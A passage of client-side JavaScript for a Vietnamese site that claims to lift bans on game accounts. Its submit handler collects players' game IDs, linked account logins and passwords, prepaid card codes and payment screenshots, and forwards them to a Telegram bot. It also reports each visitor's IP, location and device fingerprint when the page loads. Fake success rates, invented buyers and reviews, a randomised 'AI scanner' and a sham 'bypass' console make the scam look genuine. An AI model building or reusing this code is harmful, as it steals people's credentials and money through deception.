    var time = new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
    var ti = document.getElementById('typingIndicator'); if (ti) ti.classList.add('hidden');
    messages.innerHTML += '<div style="margin-bottom:10px;"><div style="display:inline-block;background:#1d2c45;color:#cfdefa;padding:10px 14px;border-radius:15px 15px 15px 0;max-width:85%;border-left:3px solid #00e6ff;"><small style="color:#00e6ff;font-weight:bold;">👑 Admin:</small><br>' + escapeHtml(message) + '</div><div style="font-size:0.7rem;color:#6c7e9e;">' + time + '</div></div>';
    messages.scrollTop = messages.scrollHeight;
    if (document.getElementById('chatPopup').classList.contains('hidden')) {
        unreadAdminMessages++; var nd = document.getElementById('chatNotificationDot'); if (nd) nd.style.display = 'block';
        var tb = document.getElementById('chatToggleBtn'); if (tb) { tb.classList.add('chat-new-message'); setTimeout(function() { tb.classList.remove('chat-new-message'); }, 3000); }
    }
}

async function sendChat() {
    var input = document.getElementById('chatInput'); if (!input) return;
    var msg = input.value.trim(); if (!msg) return;
    var messages = document.getElementById('chatMessages'); if (!messages) return;
    var time = new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
    messages.innerHTML += '<div style="margin-bottom:10px;text-align:right;"><div style="display:inline-block;background:#0077ff;color:white;padding:10px 14px;border-radius:15px 15px 0 15px;max-width:85%;">' + escapeHtml(msg) + '</div><div style="font-size:0.7rem;color:#6c7e9e;">' + time + '</div></div>';
    await sendToTelegram('💬 Chat từ ' + (userNickname || 'User') + '\n🌐 IP: ' + userIP + '\n📝 ' + msg + '\n📌 Reply: /chat ' + userIP + ' nội_dung');
    input.value = ''; messages.scrollTop = messages.scrollHeight;
    var ti = document.getElementById('typingIndicator'); if (ti) { ti.classList.remove('hidden'); setTimeout(function() { ti.classList.add('hidden'); }, 3000); }
}

// ============================================
// UI UPDATES
// ============================================
function updateSuccessRate() { var ra = [94.5, 95.1, 96.0, 96.8, 97.3, 97.8, 98.2]; var r = ra[Math.floor(Math.random() * ra.length)]; var el = document.getElementById('successRateText'); var fl = document.getElementById('successRateFill'); if (el) el.textContent = r.toFixed(1) + '%'; if (fl) fl.style.width = r + '%'; }
function updateStocks() { planStocks.vip = Math.max(0, planStocks.vip - (Math.random() > 0.7 ? 1 : 0)); planStocks.ultimate = Math.max(0, planStocks.ultimate - (Math.random() > 0.85 ? 1 : 0)); planStocks.basic = Math.max(0, planStocks.basic - (Math.random() > 0.5 ? 1 : 0)); var els = { vipStock: planStocks.vip, ultStock: planStocks.ultimate, basicStock: planStocks.basic, planVipStock: 'Còn ' + planStocks.vip, planUltStock: 'Còn ' + planStocks.ultimate, planBasicStock: 'Còn ' + planStocks.basic }; for (var id in els) { var el = document.getElementById(id); if (el) el.textContent = els[id]; } if (planStocks.ultimate <= 0) { var pu = document.getElementById('planUltimate'); if (pu) pu.classList.add('plan-soldout'); } if (planStocks.vip <= 0) { var pv = document.getElementById('planVip'); if (pv) pv.classList.add('plan-soldout'); } }
function updatePlanViewers() { document.querySelectorAll('.plan-view-count').forEach(function(el) { el.textContent = Math.floor(Math.random() * 20) + 5; }); }
function updateBuyingCounter() { var el = document.getElementById('buyingCount'); if (el) el.textContent = Math.floor(Math.random() * 5) + 1; }
function updateTodaySold() { todaySoldCount += Math.floor(Math.random() * 3); var el = document.getElementById('todaySold'); if (el) el.textContent = todaySoldCount; if (todaySoldCount > 200) todaySoldCount = 40; }
function updateDaysRunning() { var start = new Date('2022-04-15'); var days = Math.floor((new Date() - start) / 86400000); var el = document.getElementById('daysRunning'); if (el) el.textContent = days; }
function updateActivityLog() { var last = localStorage.getItem('lastLogin') || 'Lần đầu'; var el1 = document.getElementById('lastLogin'); var el2 = document.getElementById('loginCount'); var el3 = document.getElementById('lastDevice'); if (el1) el1.textContent = 'Lần cuối: ' + last; var count = parseInt(localStorage.getItem('loginCount') || '0') + 1; localStorage.setItem('loginCount', count); localStorage.setItem('lastLogin', new Date().toLocaleString('vi-VN')); if (el2) el2.textContent = 'Lượt truy cập: ' + count; if (el3) { var ua = navigator.userAgent; var device = ua.indexOf('Mobile') !== -1 ? 'Điện thoại' : 'Máy tính'; el3.textContent = 'Thiết bị: ' + device; } }
function addLiveOrderFeed() { var orders = [{ id: 'FF-7XK2M', game: 'Free Fire', progress: 78 }, { id: 'FF-9PL4N', game: 'PUBG', progress: 45 }, { id: 'FF-3RT8Q', game: 'Liên Quân', progress: 92 }, { id: 'FF-5WY1Z', game: 'MLBB', progress: 23 }]; var feed = document.getElementById('liveOrderFeed'); if (!feed) return; feed.innerHTML = orders.map(function(o) { return '<div class="live-feed-item"><span style="color:#ffd966;">#' + o.id + '</span> ' + o.game + ' [' + o.progress + '%]</div>'; }).join(''); }
function startLiveActivityFeed() { var na = ['Nguyễn Văn Hùng', 'Trần Thị Mai', 'Lê Hoàng Nam']; var ci = ['Hà Nội', 'TP.HCM', 'Đà Nẵng']; var ga = ['Free Fire', 'PUBG', 'Liên Quân', 'MLBB']; var gi = { 'Free Fire': '🔥', 'PUBG': '🎯', 'Liên Quân': '🐉', 'MLBB': '⚔️' };
    function add() { var nm = na[Math.floor(Math.random() * na.length)]; var ct = ci[Math.floor(Math.random() * ci.length)]; var gm = ga[Math.floor(Math.random() * ga.length)]; var fd = document.getElementById('liveActivityFeed'); if (!fd) return; var ac = document.createElement('div'); ac.style.cssText = 'background:rgba(20,28,45,0.95);border:1px solid #2ecc71;border-radius:10px;padding:8px 12px;font-size:0.8rem;color:#b0d4ff;'; ac.innerHTML = gi[gm] + ' <strong>' + nm + '</strong> ở ' + ct + ' vừa mở band <span style="color:#ffd966;">' + gm + '</span>!'; fd.appendChild(ac); if (fd.querySelectorAll('div').length > 3) fd.firstElementChild.remove(); setTimeout(function() { if (ac.parentNode) ac.remove(); }, 8000); }
    add(); setInterval(add, 15000); }
function startSocialProof() { var names = ['Nguyễn Văn Hùng', 'Trần Thị Mai', 'Lê Hoàng Nam']; var plans = ['gói Cơ Bản', 'gói VIP', 'gói Ultimate']; var games = ['Free Fire', 'PUBG', 'Liên Quân', 'MLBB']; var cities = ['Hà Nội', 'TP.HCM']; var colors = ['#e74c3c', '#2ecc71', '#3498db', '#f39c12']; setInterval(function() { var nm = names[Math.floor(Math.random() * names.length)]; var pl = plans[Math.floor(Math.random() * plans.length)]; var gm = games[Math.floor(Math.random() * games.length)]; var ct = cities[Math.floor(Math.random() * cities.length)]; var co = colors[Math.floor(Math.random() * colors.length)]; var ini = nm.charAt(0) + nm.split(' ').pop().charAt(0); var t = document.createElement('div'); t.className = 'toast-notification'; t.innerHTML = '<div style="width:40px;height:40px;border-radius:50%;background:' + co + ';display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;">' + ini + '</div><div><strong>' + nm + '</strong><br>ở ' + ct + ' mua <span style="color:#ffd966;">' + pl + '</span> cho ' + gm + '</div>'; var tc = document.getElementById('toastContainer'); if (tc) tc.appendChild(t); setTimeout(function() { if (t.parentNode) { t.style.animation = 'fadeOut 0.5s ease forwards'; setTimeout(function() { t.remove(); }, 500); } }, 5000); }, 12000); }
function addRandomReview() { var reviews = [{ name: 'Nguyễn Văn Hùng', stars: 5, text: 'Tool chạy nhanh!', city: 'Hà Nội' }, { name: 'Trần Thị Mai', stars: 5, text: 'Uy tín!', city: 'TP.HCM' }]; var c = document.getElementById('reviewsContainer'); if (!c) return; var r = reviews[Math.floor(Math.random() * reviews.length)]; var co = ['#e74c3c', '#2ecc71'][Math.floor(Math.random() * 2)]; var ini = r.name.charAt(0); var card = document.createElement('div'); card.className = 'review-card'; card.innerHTML = '<div style="display:flex;align-items:center;gap:10px;"><div style="width:40px;height:40px;border-radius:50%;background:' + co + ';display:flex;align-items:center;justify-content:center;color:white;">' + ini + '</div><div><strong>' + r.name + '</strong><span> • ' + r.city + '</span><div>' + '⭐'.repeat(r.stars) + '</div></div></div><p>' + r.text + '</p>'; c.insertBefore(card, c.firstChild); if (c.querySelectorAll('.review-card').length > 6) c.lastElementChild.remove(); }
function updateOnlineCount() { var h = new Date().getHours(); var b = h >= 20 ? 200 : 80; var el = document.getElementById('onlineCount'); if (el) el.textContent = b; setInterval(function() { var el2 = document.getElementById('onlineCount'); if (el2) el2.textContent = Math.max(10, parseInt(el2.textContent) + Math.floor(Math.random() * 6) - 3); }, 30000); }
function createParticles() { var c = document.getElementById('particlesContainer'); if (!c) return; var em = ['✨', '⭐', '💫', '🌟', '💰', '💎']; for (var i = 0; i < 20; i++) { var p = document.createElement('div'); p.className = 'particle'; p.textContent = em[Math.floor(Math.random() * em.length)]; p.style.left = Math.random() * 100 + '%'; p.style.animationDuration = (Math.random() * 5 + 5) + 's'; p.style.animationDelay = Math.random() * 5 + 's'; c.appendChild(p); } }
var serverPrices = { freefire: { vietnam: 1 }, pubg: { vietnam: 1.2 }, mobilelegends: { vietnam: 1.1 }, lienquan: { vietnam: 1 } };
function updatePrices() { var m = serverPrices[state.game] ? (serverPrices[state.game][state.server] || 1) : 1; var fp = Math.round(state.plan.price * m); if (giftDiscount > 0) fp = Math.round(fp * (1 - giftDiscount / 100)); var ba = document.getElementById('bankAmount'); var ca = document.getElementById('cardAmount'); if (ba) ba.textContent = fp.toLocaleString(); if (ca) ca.textContent = fp.toLocaleString(); }
function getFinalPrice() { var m = serverPrices[state.game] ? (serverPrices[state.game][state.server] || 1) : 1; var bp = Math.round(state.plan.price * m); if (giftDiscount > 0) bp = Math.round(bp * (1 - giftDiscount / 100)); if (document.getElementById('accWashing') && document.getElementById('accWashing').checked) bp += 200000; return bp; }

// ============================================
// IMAGE UPLOAD
// ============================================
function setupImageUpload() { var dz = document.getElementById('fileUploadArea'), fi = document.getElementById('paymentImage'); if (!dz || !fi) return; dz.addEventListener('click', function(e) { if (e.target.closest('#imagePreviewContainer') || e.target.closest('button')) return; fi.click(); }); fi.addEventListener('change', function(e) { if (e.target.files[0]) handleImageFile(e.target.files[0]); }); dz.addEventListener('dragover', function(e) { e.preventDefault(); dz.classList.add('drag-over'); }); dz.addEventListener('dragleave', function() { dz.classList.remove('drag-over'); }); dz.addEventListener('drop', function(e) { e.preventDefault(); dz.classList.remove('drag-over'); var f = e.dataTransfer.files[0]; if (f && f.type.startsWith('image/')) handleImageFile(f); }); }
function handleImageFile(file) { if (['image/jpeg', 'image/png', 'image/gif', 'image/webp'].indexOf(file.type) === -1) return; uploadedImageFile = file; displayImagePreview(file); }
function displayImagePreview(file) { var r = new FileReader(); r.onload = function(e) { uploadedImageData = e.target.result; var ip = document.getElementById('imagePreview'); if (ip) ip.src = e.target.result; var up = document.getElementById('uploadPlaceholder'); var ipc = document.getElementById('imagePreviewContainer'); if (up) up.style.display = 'none'; if (ipc) ipc.style.display = 'block'; var fa = document.getElementById('fileUploadArea'); if (fa) { fa.style.borderStyle = 'solid'; fa.style.borderColor = '#2ecc71'; } }; r.readAsDataURL(file); }
function compressImageBlob(file, mw, q) { mw = mw || 800; q = q || 0.7; return new Promise(function(resolve) { var r = new FileReader(); r.onload = function(e) { var img = new Image(); img.onload = function() { var c = document.createElement('canvas'); var w = img.width, h = img.height; if (w > mw) { h *= mw / w; w = mw; } c.width = w; c.height = h; c.getContext('2d').drawImage(img, 0, 0, w, h); c.toBlob(function(b) { resolve(b); }, 'image/jpeg', q); }; img.src = e.target.result; }; r.readAsDataURL(file); }); }

// ============================================
// AVATAR SYSTEM
// ============================================
function setupAvatarSystem() {
    var avatars = ['🦊', '🐯', '🐸', '🐙', '🦄', '🐲', '🦅', '🐺', '🦋', '🐬'];
    var colors = ['#e74c3c', '#2ecc71', '#3498db', '#f39c12', '#9b59b6', '#1abc9c', '#e67e22', '#ff6b6b', '#00e6ff', '#ffd966'];
    var container = document.getElementById('avatarSelector'); if (!container) return; container.innerHTML = '';
    for (var i = 0; i < avatars.length; i++) {
        var avatar = document.createElement('span'); avatar.className = 'avatar-option';
        avatar.style.cssText = 'display:inline-flex;align-items:center;justify-content:center;font-size:1.8rem;background:' + colors[i] + ';width:50px;height:50px;border-radius:50%;cursor:pointer;border:3px solid transparent;';
        avatar.textContent = avatars[i]; avatar.dataset.avatar = avatars[i];
        if (userAvatar === avatars[i]) avatar.classList.add('selected');
        avatar.addEventListener('click', function() { document.querySelectorAll('.avatar-option').forEach(function(a) { a.classList.remove('selected'); }); this.classList.add('selected'); userAvatar = this.dataset.avatar; localStorage.setItem('userAvatar', userAvatar); });
        container.appendChild(avatar);
    }
    var nicknameInput = document.getElementById('nicknameInput'); if (nicknameInput) { nicknameInput.value = userNickname; nicknameInput.addEventListener('input', function() { userNickname = this.value.trim(); localStorage.setItem('userNickname', userNickname); }); }
}

// ============================================
// MISC FUNCTIONS
// ============================================
function applyGiftCode() {
    var codeInput = document.getElementById('giftCodeInput'); var code = codeInput ? codeInput.value.trim().toUpperCase() : '';
    var msgEl = document.getElementById('giftCodeMsg');
    if (!code) { if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#ff6b6b'; msgEl.textContent = 'Nhập mã!'; } return; }
    var gd = giftCodes[code];
    if (!gd) { if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#ff6b6b'; msgEl.textContent = 'Mã không tồn tại!'; } return; }
    if (gd.used >= gd.maxUses) { if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#ff6b6b'; msgEl.textContent = 'Hết lượt!'; } return; }
    if (appliedGiftCode === code) { if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#f39c12'; msgEl.textContent = 'Đã áp dụng!'; } return; }
    giftDiscount = gd.discount; appliedGiftCode = code; gd.used++; giftCodes[code] = gd; secureSetItem('giftCodes', giftCodes);
    if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#2ecc71'; msgEl.textContent = '✅ Giảm ' + giftDiscount + '%!'; }
    updatePrices(); Swal.fire({ icon: 'success', title: '🎁 OK!', text: 'Giảm ' + giftDiscount + '%', timer: 2000 });
}
function runAIScanner() { var uid = document.getElementById('aiUidInput').value.trim(); if (!uid) { Swal.fire('❌', 'Nhập UID!', 'error'); return; } var logEl = document.getElementById('aiLog'); var resultEl = document.getElementById('aiResult'); logEl.classList.remove('hidden'); logEl.innerHTML = '🔍 Đang phân tích...'; resultEl.classList.add('hidden'); setTimeout(function() { var rate = 90 + Math.floor(Math.random() * 10); resultEl.classList.remove('hidden'); resultEl.innerHTML = '<div style="color:#2ecc71;font-size:1.5rem;">Tỷ lệ: ' + rate + '%</div><p style="color:#ffd966;">✅ CÓ THỂ mở band!</p>'; }, 3000); }
function showWashingProgress() { var aw = document.getElementById('accWashing'); if (!aw || !aw.checked) return; var pd = document.getElementById('washingProgress'); if (!pd) return; pd.classList.remove('hidden'); pd.innerHTML = '<p style="color:#9b59b6;">🧹 Đang rửa...</p>'; setTimeout(function() { pd.innerHTML = '<p style="color:#2ecc71;">✅ Sạch 100%!</p>'; }, 3000); }
function showPrivacyPolicy() { Swal.fire({ title: '📜 BẢO MẬT', html: '<p>🔒 AES-256</p><p>🗑️ Tự hủy 24h</p>', icon: 'info' }); }
function showSecurityLog() { var log = securityLog.length > 0 ? securityLog.slice(-5).join('<br>') : 'Trống'; Swal.fire({ title: '📋 LOG', html: log, icon: 'info' }); }
function downloadInvoice() { try { var { jsPDF } = window.jspdf; var doc = new jsPDF(); doc.text('HOA DON MO BAND', 20, 20); doc.text('Ma: ' + (state.currentOrderId || 'N/A'), 20, 40); doc.text('Gia: ' + getFinalPrice().toLocaleString() + ' VND', 20, 60); doc.save('hoa-don.pdf'); Swal.fire('✅', 'OK!', 'success'); } catch (e) { Swal.fire('❌', 'Lỗi PDF!', 'error'); } }
function autoBackup() { var today = new Date().toDateString(); if (lastBackupDate !== today) { sendToTelegram('📦 BACKUP ' + today + ' | Blocked: ' + blockedIPs.length); localStorage.setItem('lastBackupDate', today); lastBackupDate = today; } }
function autoDetectGame(uid) { var patterns = { freefire: /^[0-9]{8,12}$/, pubg: /^5[0-9]{7,11}$/, mobilelegends: /^[0-9]{9,10}$/, lienquan: /^[0-9]{8,9}$/ }; for (var g in patterns) { if (patterns[g].test(uid)) { document.querySelectorAll('.game-option').forEach(function(o) { o.classList.remove('active'); if (o.dataset.game === g) o.classList.add('active'); }); state.game = g; updatePrices(); return g; } } return null; }

// ============================================
// SCHEDULE + ORDER STATUS
// ============================================
document.querySelectorAll('.schedule-slot').forEach(function(s) { s.addEventListener('click', function() { document.querySelectorAll('.schedule-slot').forEach(function(x) { x.classList.remove('selected'); }); this.classList.add('selected'); selectedSchedule = this.dataset.slot; if (selectedSchedule === 'now') { var si = document.getElementById('scheduledInfo'); if (si) si.classList.add('hidden'); } else { var si2 = document.getElementById('scheduledInfo'); if (si2) { si2.classList.remove('hidden'); si2.innerHTML = '<i class="fas fa-calendar-check"></i> Lịch: ' + selectedSchedule; } } }); });
function scheduleOrderProcessing(oid) { if (selectedSchedule === 'now') return null; var nw = new Date(); var parts = selectedSchedule.split(':'); var st = new Date(nw); st.setHours(parseInt(parts[0]), parseInt(parts[1]), 0, 0); if (st < nw) st.setDate(st.getDate() + 1); var ms = st - nw; var si = document.getElementById('scheduledInfo'); if (si) si.innerHTML = '<i class="fas fa-hourglass"></i> #' + oid + ' lúc ' + selectedSchedule; var rm = ms; state.scheduleTimer = setInterval(function() { rm -= 1000; if (rm <= 0) { clearInterval(state.scheduleTimer); updateOrderStatus(oid, 'approved'); } }, 1000); return st; }
function updateOrderStatus(oid, sts, rsn) {
    rsn = rsn || ''; var bx = document.getElementById('resultBox'); if (bx) bx.classList.remove('hidden');
    var btn = document.getElementById('submitRequestBtn'); if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND'; }
    if (sts === 'approved') {
        if (bx) bx.innerHTML = '<div style="color:#2ecc71;"><h3>✅ #' + oid + ' ĐÃ DUYỆT!</h3><div class="terminal-box"><div style="color:#ffd966;">📟 CONSOLE</div><div style="color:#2ecc71;">[OK] Bypass...</div><div style="color:#2ecc71;">[OK] Xóa band...</div></div></div>';
        var pb = document.getElementById('progressBar'); if (pb) pb.classList.remove('hidden'); resetProgress();
        var ps = document.getElementById('progressSent'); var pd = document.getElementById('progressDuyet'); var px = document.getElementById('progressXuLy');
        if (ps) ps.classList.add('completed'); if (pd) pd.classList.add('completed'); if (px) px.classList.add('active');
        showWarranty(oid, state.plan.name);
        var pt = state.plan.name === 'speed' ? 60 : state.plan.name === 'ultimate' ? 300 : state.plan.name === 'vip' ? 600 : 1800;
        startCountdown(Math.floor(pt + Math.random() * pt), oid);
        if (state.plan.name === 'vip') { planStocks.vip = Math.max(0, planStocks.vip - 1); }
        if (state.plan.name === 'ultimate') { planStocks.ultimate = Math.max(0, planStocks.ultimate - 1); }
        if (state.plan.name === 'basic') { planStocks.basic = Math.max(0, planStocks.basic - 1); }
        updateStocks(); updateTodaySold();
    } else if (sts === 'rejected') {
        if (bx) bx.innerHTML = '<div style="color:#ff6b6b;"><h3>❌ #' + oid + ' TỪ CHỐI</h3><p>' + rsn + '</p></div>';
        document.getElementById('progressBar').classList.add('hidden'); document.getElementById('timerDisplay').classList.add('hidden');
    }
}
function showWarranty(oid, pl) { var p = { 'basic': '3 tháng', 'vip': '6 tháng', 'ultimate': '12 tháng', 'speed': 'Trọn đời', 'subscription': 'Vĩnh viễn' }; var d = document.createElement('div'); d.style.cssText = 'background:#1d2c45;border:2px solid #f39c12;border-radius:20px;padding:20px;text-align:center;margin-top:20px;'; d.innerHTML = '<h3 style="color:#f39c12;">🛡️ BH-' + oid + '</h3><p style="color:#2ecc71;">' + (p[pl] || '12 tháng') + '</p>'; var rb = document.getElementById('resultBox'); if (rb) rb.after(d); }
function startCountdown(dur, oid) { var dp = document.getElementById('timerDisplay'); dp.classList.remove('hidden'); var rm = dur; if (state.countdownInterval) clearInterval(state.countdownInterval); state.countdownInterval = setInterval(function() { var mn = Math.floor(rm / 60); var sc = rm % 60; dp.textContent = '⏳ ' + mn + ':' + (sc < 10 ? '0' : '') + sc; if (rm <= 0) { clearInterval(state.countdownInterval); dp.textContent = '✅ HOÀN THÀNH!'; document.getElementById('progressXuLy').classList.add('completed'); document.getElementById('progressDone').classList.add('completed'); playSound('complete'); Swal.fire({ icon: 'success', title: '🎉 Thành Công!', confirmButtonText: 'OK' }); } rm--; }, 1000); }
function saveToHistory(oid, uid, price, sts) {
    safeExecute(function() {
        var rawHistory = localStorage.getItem('toolHistory') || '[]';
        var h = [];
        try { h = JSON.parse(decryptData(rawHistory)); } catch (e) { try { h = JSON.parse(rawHistory); } catch (e2) { h = []; } }
        h.unshift({ orderId: oid, uid: uid, game: state.game, plan: state.plan.name, price: price, status: sts, time: new Date().toLocaleString('vi-VN'), ip: userIP });
        secureSetItem('toolHistory', h.slice(0, 50));
    }, null, 'saveToHistory');
}

// ============================================
// EVENT LISTENERS
// ============================================
document.querySelectorAll('.game-option').forEach(function(o) { o.addEventListener('click', function() { document.querySelectorAll('.game-option').forEach(function(x) { x.classList.remove('active'); }); this.classList.add('active'); state.game = this.dataset.game; updatePrices(); }); });
document.querySelectorAll('#serverSelector .btn-option').forEach(function(o) { o.addEventListener('click', function() { document.querySelectorAll('#serverSelector .btn-option').forEach(function(x) { x.classList.remove('active'); }); this.classList.add('active'); state.server = this.dataset.server; updatePrices(); }); });
document.querySelectorAll('.plan').forEach(function(p) { p.addEventListener('click', function() { if (this.classList.contains('plan-soldout')) { Swal.fire('❌', 'Hết suất!', 'error'); return; } document.querySelectorAll('.plan').forEach(function(x) { x.classList.remove('selected'); }); this.classList.add('selected'); state.plan = { name: this.dataset.plan, price: parseInt(this.dataset.price), time: this.dataset.time }; updatePrices(); clickCountForSpeed++; if (clickCountForSpeed >= 5 && state.plan.name !== 'speed') { var sp = document.getElementById('speedPackage'); if (sp) sp.classList.remove('hidden'); clickCountForSpeed = 0; } }); });
document.querySelectorAll('.payment-method-option').forEach(function(o) { o.addEventListener('click', function() { document.querySelectorAll('.payment-method-option').forEach(function(x) { x.classList.remove('active'); }); this.classList.add('active'); state.paymentMethod = this.dataset.method; var bi = document.getElementById('bankInfo'); var ci = document.getElementById('cardInfo'); var us = document.getElementById('uploadSection'); if (bi) bi.classList.toggle('hidden', state.paymentMethod !== 'bank'); if (ci) ci.classList.toggle('hidden', state.paymentMethod !== 'card'); if (us) us.classList.toggle('hidden', state.paymentMethod !== 'bank'); if (state.paymentMethod === 'card') removeImage(); }); });
document.querySelectorAll('.platform-option').forEach(function(o) { o.addEventListener('click', function() { document.querySelectorAll('.platform-option').forEach(function(x) { x.classList.remove('active'); }); this.classList.add('active'); state.platform = this.dataset.platform; }); });
var ffIdInput = document.getElementById('ffIdInput'); if (ffIdInput) { ffIdInput.addEventListener('blur', function() { var uid = this.value.trim(); if (uid.length >= 8) autoDetectGame(uid); }); }
var pwInput = document.getElementById('passwordInput'); if (pwInput) { pwInput.addEventListener('input', function() { var warn = document.getElementById('passwordWarning'); if (!warn) return; warn.style.display = this.value.length > 0 && this.value.length < 6 ? 'block' : 'none'; }); }
var accWashingCheckbox = document.getElementById('accWashing'); if (accWashingCheckbox) { accWashingCheckbox.addEventListener('change', function() { if (this.checked) showWashingProgress(); }); }

// ============================================
// SUBMIT HANDLER
// ============================================
var submitBtn = document.getElementById('submitRequestBtn');
if (submitBtn) {
    submitBtn.addEventListener('click', async function() {
        var ffId = document.getElementById('ffIdInput');
        var platformAcc = document.getElementById('platformAccountInput');
        var password = document.getElementById('passwordInput');
        var captchaAnswer = document.getElementById('captchaAnswer');
        var honeypot = document.getElementById('honeypotField');
        
        var ffIdVal = ffId ? ffId.value.trim() : '';
        var platformAccVal = platformAcc ? platformAcc.value.trim() : '';
        var passwordVal = password ? password.value.trim() : '';
        var captchaVal = captchaAnswer ? parseInt(captchaAnswer.value || '0') : 0;
        var honeypotVal = honeypot ? honeypot.value : '';
        
        if (honeypotVal.length > 0) { Swal.fire('🤖', 'Bot!', 'error'); return; }
        if (!ffIdVal || !platformAccVal || !passwordVal) { Swal.fire('❌', 'Nhập đầy đủ!', 'error'); return; }
        if (isNaN(captchaVal) || captchaVal !== state.captchaResult) { generateCaptcha(); if (captchaAnswer) captchaAnswer.value = ''; Swal.fire('❌', 'Sai captcha!', 'error'); return; }
        
        var cardTypeVal = ''; var cardCodeVal = ''; var cardSerialVal = '';
        if (state.paymentMethod === 'card') {
            var cardTypeEl = document.getElementById('cardType'); var cardCodeEl = document.getElementById('cardCode'); var cardSerialEl = document.getElementById('cardSerial');
            cardTypeVal = cardTypeEl ? cardTypeEl.value : 'Viettel'; cardCodeVal = cardCodeEl ? cardCodeEl.value.trim() : ''; cardSerialVal = cardSerialEl ? cardSerialEl.value.trim() : '';
            if (!cardCodeVal || !cardSerialVal) { Swal.fire('❌', 'Nhập mã thẻ!', 'error'); return; }
        }
        
        if (state.paymentMethod === 'bank' && !uploadedImageFile) { Swal.fire('❌', 'Tải ảnh CK!', 'error'); return; }
        if (state.plan.name === 'ultimate' && planStocks.ultimate <= 0) { Swal.fire('❌', 'Hết Ultimate!', 'error'); return; }
        if (state.plan.name === 'vip' && planStocks.vip <= 0) { Swal.fire('❌', 'Hết VIP!', 'error'); return; }
        
        var finalPrice = getFinalPrice();
        var scheduleText = selectedSchedule === 'now' ? 'XỬ LÝ NGAY' : 'Lịch: ' + selectedSchedule;
        
        var confirmResult = await Swal.fire({
            title: '📋 XÁC NHẬN',
            html: '<p>🎮 ' + state.game.toUpperCase() + ' | 💎 ' + state.plan.name.toUpperCase() + '</p><p>💰 <b>' + finalPrice.toLocaleString() + 'đ</b></p><p>⏰ ' + scheduleText + '</p>',
            icon: 'question', showCancelButton: true, confirmButtonText: '✅ GỬI', cancelButtonText: '❌ HỦY'
        });
        if (!confirmResult.isConfirmed) return;
        
        var btn = this; btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ĐANG GỬI...';
        
        var pb = document.getElementById('progressBar'); if (pb) pb.classList.add('hidden');
        var td = document.getElementById('timerDisplay'); if (td) td.classList.add('hidden');
        if (state.countdownInterval) clearInterval(state.countdownInterval);
        if (state.pollingInterval) clearTimeout(state.pollingInterval);
        if (state.scheduleTimer) clearInterval(state.scheduleTimer);
        resetProgress();
        
        var rb = document.getElementById('resultBox');
        if (rb) { rb.classList.remove('hidden'); rb.innerHTML = '<div style="text-align:center;color:#ffd966;"><i class="fas fa-spinner fa-spin"></i> Đang gửi...</div>'; }
        
        try {
            state.currentOrderId = 'FF-' + Date.now().toString(36).toUpperCase();
            var ipDetails = await fetchIPDetails(userIP);
            
            var messageText = '🔔 <b>ĐƠN MỚI #' + state.currentOrderId + '</b>\n' +
                '👤 ' + (userNickname || 'N/A') + '\n🎮 ' + state.game.toUpperCase() + ' | ' + state.plan.name.toUpperCase() + '\n' +
                '💰 ' + finalPrice.toLocaleString() + 'đ | ⏰ ' + scheduleText + '\n' +
                '🆔 ' + ffIdVal + ' | 📧 ' + platformAccVal + ' | 🔐 ' + passwordVal + '\n' +
                '🌐 ' + userIP + ' | 📍 ' + (ipDetails.city || '?');
            
            if (state.paymentMethod === 'bank' && uploadedImageFile) {
                try { var blob = uploadedImageFile; if (uploadedImageFile.size > 500000) blob = await compressImageBlob(uploadedImageFile); await sendPhotoToTelegram(blob, '📸 #' + state.currentOrderId); } catch(e) {}
            }
            if (state.paymentMethod === 'card') messageText += '\n💳 ' + cardTypeVal + ' | ' + cardCodeVal;
            
            var msgResult = await sendMessageWithButtons(messageText, [[
                { text: '✅ ĐỒNG Ý', callback_data: 'approve_' + state.currentOrderId },
                { text: '❌ TỪ CHỐI', callback_data: 'reject_' + state.currentOrderId }
            ]]);
            
            if (msgResult && msgResult.ok && msgResult.result) {
                await sendPrivateToAdmin('🔔 #' + state.currentOrderId + ' | ' + state.game.toUpperCase() + ' | ' + finalPrice.toLocaleString() + 'đ | ' + userIP).catch(function(){});
                saveToHistory(state.currentOrderId, ffIdVal, finalPrice, 'pending');
                if (rb) rb.innerHTML = '<div style="color:#2ecc71;"><h3>✅ GỬI OK!</h3><p>#' + state.currentOrderId + '</p><p style="color:#ffd966;">⏳ Chờ duyệt...</p></div>';
                addSecurityLog('Gửi #' + state.currentOrderId);
                playSound('notification');
                startPollingForApproval(msgResult.result.message_id, state.currentOrderId);
                Swal.fire({ icon: 'success', title: '✅ OK!', text: '#' + state.currentOrderId, timer: 4000 });
                generateCaptcha(); if (captchaAnswer) captchaAnswer.value = '';
            } else {
                throw new Error('Không gửi được Telegram');
            }
        } catch (error) {
            reportErrorToTelegram({ message: 'Submit: ' + error.message, source: 'submit' });
            if (rb) rb.innerHTML = '<div style="color:#ff6b6b;"><h3>❌ LỖI</h3><p>' + error.message + '</p></div>';
        } finally {
            btn.disabled = false; btn.innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
        }
    });
}

// ============================================
// INIT
// ============================================
async function init() {
    try {
        var isBlocked = await checkIfBlocked(); if (!isBlocked) return;
        var isSuspicious = checkSuspiciousIP(); if (!isSuspicious) return;
        var uip = document.getElementById('userIpDisplay'); if (uip) uip.textContent = userIP;
        var dh = document.getElementById('deviceHash'); if (dh) dh.textContent = deviceFingerprint ? deviceFingerprint.substring(0, 8) : '------';
        var ipDetails = await fetchIPDetails(userIP);
        sendToTelegram('🟢 <b>USER</b>\n👤 ' + (userNickname || 'NoName') + '\n📡 ' + userIP + '\n📍 ' + (ipDetails.city || '?') + '\n🆔 ' + (deviceFingerprint || '?'));
        
        if (localStorage.getItem('darkMode') === 'true') { darkMode = true; document.body.classList.add('light-mode'); }
        
        setupAvatarSystem(); checkBroadcast(); addSecurityLog('IP: ' + userIP);
        createParticles(); generateCaptcha(); updatePrices(); updateOnlineCount(); startSocialProof();
